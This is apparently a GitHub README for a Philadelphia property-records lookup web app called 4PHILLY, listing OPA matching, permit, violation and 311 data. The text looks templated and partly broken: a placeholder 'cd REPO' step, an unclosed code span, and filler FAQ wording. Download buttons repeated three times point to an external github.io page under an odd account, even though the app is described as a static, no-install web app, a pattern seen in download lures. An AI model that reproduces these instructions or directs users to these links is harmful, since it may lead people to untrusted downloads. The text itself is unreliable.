# 4PHILLY v2.5.0-beta - Philadelphia property records lookup 2026

> **Philadelphia property records lookup for the web, 4PHILLY v2.5.0-beta pairs live city data with OPA-based property matching and offline-ready PWA access in a single installable app.**

[![Platform](https://img.shields.io/badge/Platform-web%20PWA-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.5.0-beta-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mason-hillzvmy7588/4philly-opa-property-search?style=flat-square)](https://github.com/mason-hillzvmy7588/4philly-opa-property-search)

---

<p align="center">
  <a href="https://mason-hillzvmy7588.github.io/4philly-opa-property-search/">
    <img src="https://img.shields.io/badge/Download-4PHILLY%20Latest-brightgreen?style=for-the-badge" alt="Download 4PHILLY">
  </a>
</p>

> **[Direct Download - 4PHILLY v2.5.0-beta](https://mason-hillzvmy7588.github.io/4philly-opa-property-search/)**

---

[Download Latest Build](https://mason-hillzvmy7588.github.io/4philly-opa-property-search/)

---

## About 4PHILLY

4PHILLY is a browser-based lookup app for Philadelphia property records. It gathers city API data so users can inspect property information without jumping across multiple public websites. The app uses OPA resolution logic and also compares results against Eclipse and Carto, which can reveal mismatches that are useful during research.

It is aimed at anyone who needs a clear snapshot of a property before taking the next step. That includes tenants, researchers, advocates, and people checking records related to licenses, violations, permits, 311 complaints, and council district information. Built as a static, installable PWA, it stays lightweight and does not require a backend service.

---

## Features

- Real-time lookup using Philadelphia city APIs
- OPA-driven property matching with fallback handling
- Eclipse and Carto drift checks for record comparison
- License and violation status review
- Visibility into 311 complaint history
- Access to permit and building certification data
- Councilmember contact details for the applicable district
- Installable PWA with offline-capable behavior
- Static architecture with no backend requirement

---

## Installation

You can clone the repo or download the files, then open the app in any browser that supports PWA installation.

1. Clone the repository:
   `git clone https://github.com/mason-hillzvmy7588/4philly-opa-property-search.git
2. Enter the project directory:
   `cd REPO`
3. Serve or open the static app using your preferred local web server.
4. Launch the app in the browser and install it if you want offline access.

If you are using a hosted build, open the latest published link and follow the browser prompt to add it to your device.

---

## Usage

To use 4PHILLY, search for a Philadelphia property and inspect the records returned by the app. It is useful for comparing OPA data with other city sources, checking active licenses or violations, and reviewing complaint or permit history in one place.

Typical workflow:
1. Search for a property address or related record.
2. Review the resolved OPA match and any fallback result.
3. Compare Eclipse and Carto values when you want a second view of the data.
4. Check licenses, violations, 311 complaints, and permits.
5. Use council district details and contact information as needed.

Because the app is static, the interface is meant to be opened directly in a browser or installed as a PWA for repeat use.

---

## Configuration

4PHILLY is a static app with no backend, so most behavior is defined in the front-end source and build assets. When configuration is exposed, it usually lives in client-side settings or static data files.

Common places to review include:
- API endpoint references
- city data source mappings
- display or lookup defaults
- PWA manifest and service worker settings

If you update the app for a different deployment path, make sure the hosted base URL matches the published build location.

---

## Requirements

- A modern web browser with JavaScript support
- Access to Philadelphia city data endpoints used by the app
- Sufficient network access for live lookups
- Optional PWA support for installation and offline use
- Static hosting or local web serving for development and testing

---

## FAQ

**Does 4PHILLY need a server?**  
No. The app is described as a static front end with no backend dependency.

**Can I use it offline?**  
It is installable as a PWA and includes offline-oriented behavior, but live city lookups still depend on network access.

**Where does the data come from?**  
The app uses live data from Philadelphia city APIs and related record sources such as OPA, Eclipse, and Carto.

**What should I do if a record looks incomplete?**  
Try another address format, review the OPA resolution, and compare the available source views. If the city source is slow or unavailable, retry later.

**How do I update to the latest version?**  
Open the latest published build and refresh your installed copy if you are using the PWA version.

**Where are issues or support handled?**  
Use the repository's normal issue or discussion workflow if one is available for this project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
